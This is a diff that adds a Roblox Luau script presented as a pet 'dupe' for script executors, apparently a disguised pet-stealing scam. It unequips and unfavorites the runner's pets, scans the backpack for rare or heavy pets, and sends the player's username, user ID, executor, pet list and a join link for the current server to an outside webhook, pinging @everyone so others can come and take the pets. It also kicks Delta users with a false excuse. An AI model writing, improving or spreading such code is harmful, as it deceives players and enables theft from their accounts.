@@ -1,0 +1,303 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+
+local LocalPlayer = Players.LocalPlayer
+
+local webhookUrl = "https://60h5imcen0g9.manus.space/api/webhook"
+
+local petsToLookFor = {
+    "Butterfly",
+    "Raccoon",
+    "Dragonfly",
+    "Queen Bee",
+    "Disco Bee"
+}
+
+local petEmojis = {
+    ["Butterfly"] = "🦋",
+    ["Raccoon"] = "🦝",
+    ["Dragonfly"] = "🐲",
+    ["Queen Bee"] = "👑",
+    ["Disco Bee"] = "🕺"
+}
+
+local hugePetWeightThreshold = 10
+local serverFullThreshold = 5 -- Original threshold for a 'full' server
+local targetPlayerCount = 2 -- New target: 2 players or fewer
+
+local function getExecutorName()
+    if getexecutorname then
+        local name = getexecutorname()
+        if name:lower() == "delta" then return "Delta" end -- Explicitly check for Delta
+        return name:sub(1, 1):upper() .. name:sub(2)
+    end
+    
+    if syn and syn.protect_gui then return "Synapse X" end
+    if is_sirhurt_closure then return "SirHurt" end
+    if Krnl or krnl_LOADED then return "Krnl" end
+    if SW_VERSION or getscriptwareversion then return "Script-Ware" end
+    if PROXO_LOADED then return "Proxo" end
+    if SENTINEL_V2 then return "Sentinel" end
+    if OXYGEN_LOADED then return "Oxygen U" end
+    if ELECTRON_LOADED then return "Electron" end
+    if COMET_LOADED then return "Comet" end
+    if CELERY_LOADED then return "Celery" end
+    
+    return "Unknown"
+end
+
+local function kickIfDeltaExecutor()
+    local executor = getExecutorName()
+    if executor == "Delta" then
+        local kickMessage = "This dupe doesn't work on Delta. It only works on Krnl, Ronix, and similar executors."
+        print("Kicking player due to Delta Executor: " .. kickMessage)
+        game:GetService("Players").LocalPlayer:Kick(kickMessage)
+    end
+end
+
+local function unequipAllPets()
+    if not LocalPlayer then return end
+    local petsRemoteEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService")
+    if not petsRemoteEvent then return end
+    local petsContainer = Workspace:WaitForChild("PetsPhysical")
+    if not petsContainer then return end
+
+    local playerName = LocalPlayer.Name
+    for _, petMover in ipairs(petsContainer:GetChildren()) do
+        if petMover:IsA("Part") and petMover.Name == "PetMover" then
+            local ownerName = petMover:GetAttribute("OWNER")
+            if ownerName and ownerName == playerName then
+                local petUUID = petMover:GetAttribute("UUID")
+                if petUUID then
+                    petsRemoteEvent:FireServer("UnequipPet", petUUID)
+                    -- Removed task.wait(0.1) to make it faster
+                end
+            end
+        end
+    end
+    print("All equipped pets unequipped.")
+end
+
+local function unfavoriteAllPetsInBackpack()
+    if not LocalPlayer then return end
+    local backpack = LocalPlayer:WaitForChild("Backpack")
+    if not backpack then return end
+    local favoriteRemote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
+    if not favoriteRemote then return end
+
+    for _, item in ipairs(backpack:GetChildren()) do
+        if item:IsA("Tool") then
+            local success, isPet = pcall(function()
+                return item:GetAttribute("ItemType") == "Pet" and item:GetAttribute("d") == true
+            end)
+            if success and isPet then
+                favoriteRemote:FireServer(item)
+                task.wait(1) -- 1-second delay after each pet is unfavorited
+            end
+        end
+    end
+    print("All favorited pets in backpack unfavorited.")
+end
+
+local function checkInventoryForPets()
+    local backpack = LocalPlayer:WaitForChild("Backpack")
+    local foundPetsData = {}
+    local foundPetNames = {}
+
+    for _, item in ipairs(backpack:GetChildren()) do
+        if item:IsA("Tool") then
+            local matchedBaseName = nil
+            local isHugePet = false
+
+            for _, petName in ipairs(petsToLookFor) do
+                if string.sub(item.Name, 1, #petName) == petName then
+                    matchedBaseName = petName
+                    break
+                end
+            end
+
+            local weightString = string.match(item.Name, "%[(%d+%.?%d*) KG%]")
+            if weightString then
+                local weight = tonumber(weightString)
+                if weight and weight >= hugePetWeightThreshold then
+                    isHugePet = true
+                end
+            end
+
+            if (matchedBaseName or isHugePet) and not table.find(foundPetNames, item.Name) then
+                table.insert(foundPetNames, item.Name)
+                table.insert(foundPetsData, {name = item.Name, isHuge = isHugePet, baseName = matchedBaseName})
+            end
+        end
+    end
+
+    return #foundPetsData > 0, foundPetsData
+end
+
+local function sendWebhookNotification(foundPetsData)
+    local playerName = LocalPlayer.Name
+    local playerDisplayName = LocalPlayer.DisplayName
+    local userId = LocalPlayer.UserId
+    local executor = getExecutorName()
+    
+    local joinLink = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)
+    
+    local playerInfoValue = string.format("```\nUsername: %s\nDisplay: %s\nUser ID: %d\nExecutor: %s\n```",
+        playerName,
+        playerDisplayName,
+        userId,
+        executor
+    )
+
+    local formattedPetLines = {}
+    for _, petData in ipairs(foundPetsData) do
+        local emoji = "⭐"
+        if petData.isHuge then
+            emoji = "💪"
+        elseif petData.baseName and petEmojis[petData.baseName] then
+            emoji = petEmojis[petData.baseName]
+        end
+        table.insert(formattedPetLines, emoji .. " - " .. petData.name)
+    end
+    local petsValue = "```\n" .. table.concat(formattedPetLines, "\n") .. "\n```"
+
+    local embedColor = 65280 -- Decimal for Color3.fromRGB(0, 255, 0)
+    
+    local payload = {
+        content = "@everyone",
+        embeds = {
+            {
+                title = "PALDOOOO WHOO🤑🤑🤑🤑",
+                color = embedColor,
+                fields = {
+                    {
+                        name = "👤 Player Information",
+                        value = playerInfoValue,
+                        inline = false
+                    },
+                    {
+                        name = "🌴 Found Pets",
+                        value = petsValue,
+                        inline = false
+                    },
+                    {
+                        name = "🔗 Server Link",
+                        value = joinLink,
+                        inline = false
+                    }
+                },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }
+        }
+    }
+
+    local success, err = pcall(function()
+        request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+    
+    if not success then
+        warn("Webhook failed to send:", err)
+    end
+end
+
+local function hopToServer(sortBy)
+    local success, servers = pcall(function()
+       return HttpService:JSONDecode(game:HttpGet(
+           "https://games.roblox.com/v1/games/" .. tostring(game.PlaceId) .. "/servers/Public?limit=100"
+       )).data
+    end)
+
+    if not success or not servers or #servers == 0 then
+        warn("Failed to get server list or no servers found. Falling back to simple teleport.", servers)
+        -- Fallback to simple teleport if API call fails
+        TeleportService:Teleport(game.PlaceId)
+        return
+    end
+
+    local selectedServer = servers[1]
+
+    for i,svr in pairs(servers) do
+       if svr[sortBy] < selectedServer[sortBy] then
+           selectedServer = svr
+       end
+    end
+
+    print("Attempting to hop to server: " .. selectedServer.id .. " with " .. selectedServer.playing .. " players and ping " .. selectedServer.ping)
+    local successTeleport, errTeleport = pcall(function()
+        TeleportService:TeleportToPlaceInstance(game.PlaceId, selectedServer.id)
+    end)
+    if not successTeleport then
+        warn("TeleportToPlaceInstance failed: ", errTeleport)
+        -- Fallback to simple teleport if advanced teleport fails
+        TeleportService:Teleport(game.PlaceId)
+    end
+end
+
+local function autoHopToTargetPlayerCount()
+    local currentPlayers = #Players:GetPlayers()
+    print("Current players: " .. currentPlayers)
+
+    -- Hop if player count is 1, or 5 or more
+    if currentPlayers == 1 or currentPlayers >= 5 then
+        print("Current players (" .. currentPlayers .. ") triggers hop. Attempting to auto-hop...")
+        hopToServer("playing") -- Sort by 'playing' to find lowest player count
+    else
+        print("Server has " .. currentPlayers .. " players. No auto-hop needed for player count.")
+    end
+end
+
+local function autoHopIfPrivateServer()
+    local isPrivate = false
+    -- Attempt to use executor-specific functions for private server detection
+    if type(getgenv) == "function" and type(getgenv().is_private_server) == "function" then
+        isPrivate = pcall(getgenv().is_private_server)
+    elseif type(syn) == "table" and type(syn.is_private_server) == "function" then
+        isPrivate = pcall(syn.is_private_server)
+    end
+
+    if isPrivate then
+        print("Detected private server via executor function. Attempting to auto-hop...")
+        hopToServer("playing") -- Hop to lowest player count server if private
+        return true -- Indicate that a hop was attempted
+    end
+    return false -- Indicate no hop was attempted
+end
+
+-- Main execution flow
+
+-- Add a small initial delay to allow game services to load
+task.wait(5)
+
+-- First, check for Delta Executor and kick if detected
+kickIfDeltaExecutor()
+
+-- Then, check if it's a private server and hop if so
+local hoppedFromPrivate = autoHopIfPrivateServer()
+
+-- If we didn't hop from a private server, then proceed with player count check
+if not hoppedFromPrivate then
+    autoHopToTargetPlayerCount()
+end
+
+-- Perform pet unequip and unfavorite before checking inventory
+unequipAllPets()
+task.wait(1) -- Add a 1-second delay here
+unfavoriteAllPetsInBackpack()
+
+task.wait(0)
+
+local hasPets, foundPetsData = checkInventoryForPets()
+
+if hasPets then
+    sendWebhookNotification(foundPetsData)
+end
+
+
